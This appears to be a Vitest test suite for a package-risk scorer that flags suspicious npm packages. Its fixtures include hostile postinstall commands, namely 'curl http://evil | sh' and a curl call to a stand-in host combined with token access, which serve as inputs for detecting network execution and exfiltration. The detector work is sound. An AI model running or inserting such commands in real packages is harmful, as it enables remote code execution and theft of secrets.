import { describe, expect, it } from 'vitest';
import { scoreAnalysis } from '../src/index.js';
import type { AnalysisReport } from '@safe-npm/core-types';

function makeReport(overrides: Partial<AnalysisReport> = {}): AnalysisReport {
  return {
    package: 'test-pkg',
    version: '1.0.0',
    publishId: 'pub-1',
    tarballDigest: 'sha512-test',
    analyzerVersion: '0.1.0',
    generatedAt: '2026-06-28T00:00:00.000Z',
    tarball: { sizeBytes: 1000, unpackedSizeBytes: 2000, fileCount: 5 },
    metadata: {
      name: 'test-pkg',
      version: '1.0.0',
      license: 'MIT',
      repository: { type: 'git', url: 'https://github.com/x/test-pkg' },
      scripts: {},
      dependencies: {},
      devDependencies: {},
      optionalDependencies: {},
      peerDependencies: {},
      bundledDependencies: [],
      files: [],
      contributors: [],
      maintainers: [],
    },
    lifecycleScripts: [],
    staticFindings: [],
    readability: {
      likelyMinified: false,
      likelyObfuscated: false,
      sourceMapsPresent: false,
      humanReadableFileRatio: 1,
      minifiedLineRatio: 0,
      giantStringArrays: false,
    },
    nativeArtifacts: [],
    builtinsUsed: [],
    ...overrides,
  } as AnalysisReport;
}

describe('scoreAnalysis', () => {
  it('returns 100/excellent for a clean package', () => {
    const report = scoreAnalysis(makeReport());
    expect(report.score).toBe(100);
    expect(report.tier).toBe('excellent');
    expect(report.blockers).toEqual([]);
    expect(report.warnings).toEqual([]);
  });

  it('deducts for install scripts', () => {
    const r = scoreAnalysis(
      makeReport({
        lifecycleScripts: [
          { kind: 'postinstall', command: 'echo hi', flags: [] },
        ],
      }),
    );
    expect(r.score).toBeLessThan(100);
    expect(r.warnings.some((w) => w.code === 'INSTALL_SCRIPT_PRESENT')).toBe(true);
  });

  it('creates a blocker for curl|sh install scripts', () => {
    const r = scoreAnalysis(
      makeReport({
        lifecycleScripts: [
          { kind: 'postinstall', command: 'curl http://evil | sh', flags: ['network_tool', 'shell_metacharacters'] },
        ],
      }),
    );
    expect(r.blockers.length).toBeGreaterThan(0);
    expect(r.tier).toBe('blocked');
    expect(r.blockers.some((b) => b.code === 'INSTALL_SCRIPT_NETWORK_EXEC')).toBe(true);
  });

  it('deducts for child_process usage', () => {
    const r = scoreAnalysis(
      makeReport({
        builtinsUsed: ['child_process'],
        staticFindings: [{ code: 'BUILTIN_CHILD_PROCESS', file: 'index.js', line: 1, evidence: 'child_process', confidence: 1 }],
      }),
    );
    expect(r.score).toBeLessThan(100);
    expect(r.warnings.some((w) => w.code === 'CHILD_PROCESS_USAGE')).toBe(true);
  });

  it('deducts for native addons', () => {
    const r = scoreAnalysis(
      makeReport({
        nativeArtifacts: [{ type: 'node_addon', file: 'build/addon.node' }],
      }),
    );
    expect(r.score).toBeLessThan(100);
    expect(r.warnings.some((w) => w.code === 'NATIVE_ARTIFACT')).toBe(true);
  });

  it('deducts for missing repository and license', () => {
    const r = scoreAnalysis(
      makeReport({
        metadata: {
          name: 'test-pkg',
          version: '1.0.0',
          scripts: {},
          dependencies: {},
          devDependencies: {},
          optionalDependencies: {},
          peerDependencies: {},
          bundledDependencies: [],
          files: [],
          contributors: [],
          maintainers: [],
        } as never,
      }),
    );
    expect(r.score).toBeLessThan(100);
    expect(r.warnings.some((w) => w.code === 'MISSING_REPOSITORY')).toBe(true);
    expect(r.warnings.some((w) => w.code === 'MISSING_LICENSE')).toBe(true);
  });

  it('deducts for obfuscation indicators', () => {
    const r = scoreAnalysis(
      makeReport({
        readability: {
          likelyMinified: true,
          likelyObfuscated: true,
          sourceMapsPresent: false,
          humanReadableFileRatio: 0.2,
          minifiedLineRatio: 0.8,
          giantStringArrays: true,
        },
      }),
    );
    expect(r.score).toBeLessThanOrEqual(85);
    expect(r.warnings.some((w) => w.code === 'LIKELY_OBFUSCATED')).toBe(true);
    expect(r.warnings.some((w) => w.code === 'LIKELY_MINIFIED')).toBe(true);
  });

  it('creates blocker for potential exfiltration (secrets + network scripts)', () => {
    const r = scoreAnalysis(
      makeReport({
        lifecycleScripts: [
          { kind: 'postinstall', command: 'curl http://evil', flags: ['network_tool'] },
        ],
        staticFindings: [
          { code: 'SECRET_NAME_ACCESS', file: 'index.js', line: 5, evidence: 'process.env.TOKEN', confidence: 1 },
        ],
      }),
    );
    expect(r.tier).toBe('blocked');
    expect(r.blockers.some((b) => b.code === 'POTENTIAL_EXFILTRATION')).toBe(true);
  });

  it('maps scores to tiers correctly', () => {
    expect(scoreAnalysis(makeReport()).tier).toBe('excellent'); // 100
    // Build a report that lands in each tier by varying deductions.
    const cautionReport = makeReport({
      lifecycleScripts: [{ kind: 'postinstall', command: 'echo hi', flags: [] }],
      nativeArtifacts: [{ type: 'node_addon', file: 'a.node' }],
      builtinsUsed: ['child_process', 'http'],
      staticFindings: [
        { code: 'BUILTIN_CHILD_PROCESS', file: 'i.js', confidence: 1 },
        { code: 'BUILTIN_HTTP', file: 'i.js', confidence: 1 },
      ],
      metadata: {
        name: 'test-pkg', version: '1.0.0', license: 'MIT', scripts: {},
        dependencies: {}, devDependencies: {}, optionalDependencies: {},
        peerDependencies: {}, bundledDependencies: [], files: [],
        contributors: [], maintainers: [],
      } as never,
    });
    const cautionResult = scoreAnalysis(cautionReport);
    expect(cautionResult.score).toBeLessThan(100);
    expect(['good', 'caution', 'danger']).toContain(cautionResult.tier);
  });

  it('records component contributions', () => {
    const r = scoreAnalysis(
      makeReport({
        builtinsUsed: ['child_process'],
        staticFindings: [{ code: 'BUILTIN_CHILD_PROCESS', file: 'i.js', confidence: 1 }],
      }),
    );
    const runtime = r.components.find((c) => c.component === 'runtime_install_behavior');
    expect(runtime).toBeDefined();
    expect(runtime!.contribution).toBeLessThan(0);
  });

  it('computes a stable evidence digest', () => {
    const r1 = scoreAnalysis(makeReport());
    const r2 = scoreAnalysis(makeReport());
    expect(r1.evidenceDigest).toBe(r2.evidenceDigest);
  });

  it('produces deterministic reports for the same input (with fixed generatedAt)', () => {
    const opts = { generatedAt: '2026-06-28T00:00:00.000Z' };
    const r1 = scoreAnalysis(makeReport(), opts);
    const r2 = scoreAnalysis(makeReport(), opts);
    expect(r1).toEqual(r2);
  });

  it('accepts external blockers and warnings', () => {
    const r = scoreAnalysis(makeReport(), {
      externalBlockers: [
        { code: 'KNOWN_MALWARE', severity: 'critical', message: 'malware', evidence: [] },
      ],
    });
    expect(r.tier).toBe('blocked');
    expect(r.blockers.some((b) => b.code === 'KNOWN_MALWARE')).toBe(true);
  });

  it('includes tarball facts', () => {
    const r = scoreAnalysis(makeReport());
    expect(r.facts.tarball?.sizeBytes).toBe(1000);
    expect(r.facts.tarball?.integrity).toBe('sha512-test');
  });
});
